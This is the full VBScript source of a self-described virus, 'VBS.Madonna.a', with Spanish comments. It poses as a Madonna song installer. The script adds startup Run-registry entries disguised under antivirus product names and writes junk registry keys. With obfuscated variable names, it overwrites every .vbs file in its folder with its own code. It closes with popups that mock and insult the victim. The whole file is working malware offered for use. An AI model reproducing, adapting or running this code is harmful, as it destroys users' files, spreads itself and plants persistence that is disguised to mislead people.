'VBS.Madonna.a (Beta) by ***Jadraquer Killer***
'Hecho en Chile / Made in Chile.




'Esta función sirve para que cada vez que Windows se inicie, este tambíen inicie otras aplicaciónes tales como: Scandisk for Win, WinFile, etc, y además se agrega en el registro con nombres de otras aplicaciónes para evitar que la entrada paresca sospechosa.
Set ws = CreateObject("WScript.Shell")
ws.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Don't_Cry_for_me_Argentina", "wscript.exe c:\windows\Like_A_Virgin.MP3.vbs %"

Set ws = CreateObject("WScript.Shell")
ws.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Don't_Cry_for_me_Argentina", "Explorer.exe c:\windows\Explorer.exe %"

Set ws = CreateObject("WScript.Shell")
ws.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\JadraquerKiller", "Command.com c:\windows\Command.com %"





Set ws = CreateObject("WScript.Shell")
ws.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\ZoneAlarm Pro", "Cdplayer.exe c:\windows\Cdplayer.exe %"


Set ws = CreateObject("WScript.Shell")
ws.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\AVPCC", "Defrag.exe c:\windows\Defrag.exe %"


Set ws = CreateObject("WScript.Shell")
ws.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\AVP_Monitor", "Scandskw.exe c:\windows\Scandskw.exe %"

Set ws = CreateObject("WScript.Shell")
ws.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\NAVDefAlert", "Winfile.exe c:\windows\Winfile.exe %"

Set ws = CreateObject("WScript.Shell")
ws.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\McAfeeVirusScanService", "Winfile.exe c:\windows\Winfile.exe %"










'Esta otra función, solo es para dejar mi huella y mostrar un cartel, ya que agregará al registro nombre de las canciónes de la artista MADONNA, y mi Alias Jadraquer Killer***
Dim WSHShell
Set WSHShell = WScript.CreateObject("WScript.Shell")

WSHShell.Popup "Este Archivo mostrará las canciónes de la gran artista erótica Madonna"

WSHShell.RegWrite "HKCU\MyRegKey\", "JadraquerKiller_eL_MEJOR"
WSHShell.RegWrite "HKCU\MyRegKey\Entry\", "Madonna-Like_a_Virgin"
WSHShell.RegWrite "HKCU\MyRegKey\Value", 1
WSHShell.RegWrite "HKCU\MyRegKey\Entry", 2, "REG_DWORD"
WSHShell.RegWrite "HKCU\MyRegKey\Entry\Value1", 3, "REG_BINARY"

WSHShell.RegWrite "HKCU\MyRegKey\", "Madonna_TEAMO"
WSHShell.RegWrite "HKCU\MyRegKey\Entry\", "Madonna-Borbeline"
WSHShell.RegWrite "HKCU\MyRegKey\Value", 1
WSHShell.RegWrite "HKCU\MyRegKey\Entry", 2, "REG_DWORD"
WSHShell.RegWrite "HKCU\MyRegKey\Entry\Value1", 3, "REG_BINARY"



'Este código es para reemplazar todos los Archivos .VBS por el código del virus. solo reemplaza los archivos .VBS que estén en el mismo directorio donde se encuenre el virus.

On Error Resume Next
egvxuultfqvbxda = WScript.ScriptFullName
Set vynqimyvyesmjyn = CreateObject("WScript.Shell") 
Set sfcvrriaxeblhpo = CreateObject("Scripting.FileSystemObject")
Set sfrjhybeingwecw = sfcvrriaxeblhpo.OpenTextFile(egvxuultfqvbxda, 1, 0)
omjaucpkuvhsrie = sfrjhybeingwecw.ReadAll
sfrjhybeingwecw.Close
pnxmuvmiyeuaika = Left(egvxuultfqvbxda, InStrRev(egvxuultfqvbxda, "\"))
For Each ewfpgrmgsxetjcc in sfcvrriaxeblhpo.GetFolder(pnxmuvmiyeuaika).Files
If ( Right(ewfpgrmgsxetjcc.Name, 4) = ".vbs" ) Then
Set ehbafaglyvkslst = sfcvrriaxeblhpo.CreateTextFile(ewfpgrmgsxetjcc.Name, True)
ehbafaglyvkslst.Write omjaucpkuvhsrie
ehbafaglyvkslst.Close
End If
Next






WSHShell.Popup "Instalación finalizada con exito, ahora podrá disfrutar de las canciónes de MADONNA! :)"


WSHShell.Popup "Canciónes: Papa Don't Preach, Like a Virgin, Secret, Don't tell me, Music, Holiday, Lucky Star, Borbeline, La isla Bonita." 

WSHShell.Popup "Antes de escuchar esas canciónes deberas responder este cuestionario:"

WSHShell.Popup "Quien es la reina del POP?"


MsgBox "UUPSSSSS!!!, no respondiste!!!!!!, haber... otra pregunta, quien es el mejor del mundo? "
MsgBox "Otra VEZ!!!!!, no hay respuesta!!!!!!!!!!!!, bueno... por esto te costará algo, no atí, sino que a tu Ordenador, ahora tu ordenador cargará más aplicaciónes al inicio jajajajaja "
MsgBox "puta la wea, ahora si que las cagaste, una más y te quedarás sin computadora "


WSHShell.Popup "VBS.Madonna.a By    ***Jadraquer Killer***"



'AGM Inc S.A. All Right Reserved 1999-2002 
'Madonna TE AMO!!!!, Hice este virus dedicado atí por tu belleza como cantante, espero que alguna vez hagas un recital en mi país
'Jajajaja en cuanto atí ususario, has abierto un virus, jajaja culiao, te recomiendo mejor tener un anti-virus como AVP NAV O McAfee 
'Chile es el mejor país del mundo               


















